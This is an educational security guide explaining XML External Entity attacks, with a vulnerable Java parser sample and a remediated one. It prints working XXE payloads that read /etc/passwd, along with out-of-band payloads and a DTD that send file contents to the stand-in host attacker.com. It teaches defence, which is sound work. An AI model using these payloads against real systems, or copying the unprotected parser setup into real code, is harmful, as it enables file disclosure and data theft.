# XML External Entity Bypass (XXE)
This vulnerability can be found where XML data is accepted/parsed from input of external or user facing sources. The attack occurs when the XML parser does not have protections in place to limit or restrict what can be run from external sources. This can lead to data exposure, and other system impact. 


## Exploitable Fields
Fields, Files, or Endpoints that process XML data.

- Configuration files
- Data transfer formats
- API endpoints that process XML data

## Impact Of Exploit
The impact of an XXE exploit can vary widely:

- Data Exposure: Sensitive files or data can be disclosed, such as configuration files, passwords, or other private information.
- Denial of Service: The system can be overwhelmed by processing large or maliciously crafted entities, leading to denial of service.
- Server-Side Request Forgery (SSRF): Attackers can manipulate the server to send requests to other systems, potentially leading to further exploits or data breaches.
- Arbitrary Remote Code Execution: In some cases XML can be used to execute code on the system.


## Types of XML External Entity Bypass

### Traditional XXE
This involves directly injecting an external entity into the XML to read sensitive files or execute arbitrary requests.

The following maliciously crafted XML file will create an enitity that uses `SYSTEM` to read the file `/etc/password`. It then will execute the decalared element, which will pull the information inside the /etc/passwd file into the output XML file. 

```
<!DOCTYPE foo [  
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

### Blind XXE 
In a blind XXE attack, the user can not see the output of the XML, however can see the results of a successful attack in different ways. For instance, making a request to a web server, where the attacker can monitor for incoming requests. 

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/evil" > ]>
<foo>&xxe;</foo>
```

### XXE Out-of-Band (OOB):
To build on the Blind XXE, we can have the web request pull down more data (a more complex payload) from the attackers host.

```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com/exploit.dtd" > %xxe; ]>
<foo>&send;</foo>
```

In this example, the exploit.dtd file could collect data from the hosts after being requested. It then would contain an entity call `send` that would be used to forward the information back to the web server. An example exploit.dtd file:

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
```

### Parameter Entity Injection:
Parameter entities can be used in DTDs to define reusable parts of XML documents. Attacking parameter entities can sometimes bypass certain protections. In the following example we store the entities in the temp parameter of `%`.

```
<!DOCTYPE foo [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#37; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>"> %eval; ]>
<foo>&exfiltrate;</foo>
```


## Vulnerable Sample Code
The following code sample is vulnerable to XML External Entity Bypass because it does not utalize any protections/features of DocumentBuilder meant to block certain inputs. 
```
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import org.w3c.dom.Document;
import java.io.StringReader;
import javax.xml.parsers.DocumentBuilderFactory;
import org.xml.sax.InputSource;

public class XXEVulnerable {
    public static void main(String[] args) throws Exception {
        String xmlInput = "<!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>";

        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        DocumentBuilder builder = factory.newDocumentBuilder();
        Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));

        System.out.println(doc.getDocumentElement().getTextContent());
    }
}
```

## Remediated Sample Code
This remediated code sample prevents the XML External Entity Bypass exploit as it uses DocumentBuilderFactory features to limit input. This code specifically blocks declaring doctype, creating external general or parameter based entities, and loading external declarations. 
```
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import org.w3c.dom.Document;
import java.io.StringReader;
import javax.xml.parsers.DocumentBuilderFactory;
import org.xml.sax.InputSource;

public class XXEFixed {
    public static void main(String[] args) throws Exception {
        String xmlInput = "<!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>";

        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

        DocumentBuilder builder = factory.newDocumentBuilder();
        Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));

        System.out.println(doc.getDocumentElement().getTextContent());
    }
}
```
